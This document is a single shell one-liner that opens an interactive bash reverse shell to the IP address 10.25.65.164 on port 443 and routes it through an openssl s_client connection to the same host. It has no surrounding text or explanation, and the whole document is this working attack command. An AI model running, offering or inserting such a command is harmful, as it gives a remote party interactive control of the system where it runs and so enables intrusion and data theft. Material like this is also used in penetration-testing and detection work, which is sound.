bash -c 'bash -i >& /dev/tcp/10.25.65.164/443 0>&1' | openssl s_client -quiet -connect 10.25.65.164:443
